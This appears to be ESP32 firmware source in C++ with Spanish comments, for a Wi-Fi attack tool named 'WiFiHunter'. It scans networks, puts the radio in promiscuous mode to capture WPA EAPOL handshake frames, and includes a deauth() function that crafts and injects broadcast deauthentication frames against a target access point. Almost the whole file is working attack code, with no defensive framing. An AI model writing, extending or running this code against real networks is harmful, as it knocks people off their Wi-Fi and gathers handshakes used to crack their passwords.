#include "WiFiHunter.h"

// Buffer estático para el callback
static WiFiHunter* instance = nullptr;
static HandshakeCallback handshakeCB = nullptr;

// Estructura para detectar EAPOL
struct EAPOLKey {
    uint8_t version;
    uint8_t type;
    uint16_t length;
    uint8_t descriptor;
    uint8_t keyInfo[2];
    uint16_t keyLength;
    uint8_t replayCounter[8];
    uint8_t nonce[32];
    // ... más campos
};

void WiFiHunter::begin() {
    instance = this;
    
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    // Activar modo promiscuo
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    
    Serial.println("Modo promiscuo activado");
}

void WiFiHunter::scan(RedInfo* resultados, int maxRedes, int& encontradas) {
    encontradas = 0;
    
    int n = WiFi.scanNetworks(false, false);
    
    for (int i = 0; i < n && i < maxRedes; i++) {
        strncpy(resultados[i].ssid, WiFi.SSID(i).c_str(), 32);
        resultados[i].ssid[32] = '\0';
        
        memcpy(resultados[i].bssid, WiFi.BSSID(i), 6);
        resultados[i].rssi = WiFi.RSSI(i);
        resultados[i].canal = WiFi.channel(i);
        resultados[i].tieneClave = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        resultados[i].handshakeCapturado = false;
        
        encontradas++;
    }
    
    WiFi.scanDelete();
}

void WiFiHunter::setHandshakeCallback(HandshakeCallback cb) {
    handshakeCB = cb;
}

void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    if (len < 100) return; // Frame muy corto
    
    // Verificar si es un frame de datos (tipo 2)
    uint8_t frameType = (frame[0] & 0x0C) >> 2;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;
    
    // EAPOL Key tiene LLC SNAP header: AA AA 03 00 00 00 88 8E
    // Y luego: 02 (version) 03 (type = key)
    
    for (int i = 0; i < len - 8; i++) {
        if (frame[i] == 0xAA && frame[i+1] == 0xAA && frame[i+2] == 0x03 &&
            frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
            
            // Verificar si es EAPOL-Key (type 3)
            if (frame[i+9] == 0x03) {
                Serial.println("EAPOL Key detectado!");
                
                if (handshakeCB) {
                    handshakeCB(frame, len);
                }
                return;
            }
        }
    }
}

void WiFiHunter::deauth(const RedInfo& red) {
    uint8_t deauthFrame[26];
    
    deauthFrame[0] = 0xC0; // Deauth
    deauthFrame[1] = 0x00;
    deauthFrame[2] = 0x3A;
    deauthFrame[3] = 0x01;
    
    memset(&deauthFrame[4], 0xFF, 6); // Broadcast
    
    uint8_t nuestraMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
    memcpy(&deauthFrame[10], nuestraMac, 6);
    
    memcpy(&deauthFrame[16], red.bssid, 6);
    
    deauthFrame[24] = 0x07; // Reason code
    deauthFrame[25] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
}
